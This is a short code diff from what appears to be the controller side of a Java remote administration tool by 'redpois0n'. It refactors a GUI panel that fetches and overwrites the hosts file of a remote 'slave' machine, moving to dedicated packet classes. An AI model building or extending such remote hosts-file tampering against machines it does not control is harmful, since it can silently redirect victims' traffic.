@@ -19,8 +19,8 @@ import javax.swing.SwingConstants;
 
 import com.redpois0n.ErrorDialog;
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet55HostsFile;
+import com.redpois0n.packets.outgoing.Packet56UpdateHostsFile;
 import com.redpois0n.utils.Util;
 
 @SuppressWarnings("serial")
@@ -51,7 +51,7 @@ public class PanelControlHostsFile extends PanelControlParent {
 		btnGetHostsFile.setIcon(new ImageIcon(PanelControlHostsFile.class.getResource("/icons/get_host.png")));
 		btnGetHostsFile.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
-				sl.addToSendQueue(OutgoingHeader.GET_HOSTS_FILE);
+				sl.addToSendQueue(new Packet55HostsFile());
 			}
 		});
 
@@ -59,7 +59,7 @@ public class PanelControlHostsFile extends PanelControlParent {
 		btnUpdateHostsFile.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
 				if (Util.yesNo("Confirm", "Are you sure you want to update the hosts file?")) {
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.UPDATE_HOSTS, txt.getText()));
+					sl.addToSendQueue(new Packet56UpdateHostsFile(txt.getText()));
 					waitingAnswer = true;
 				}
 			}
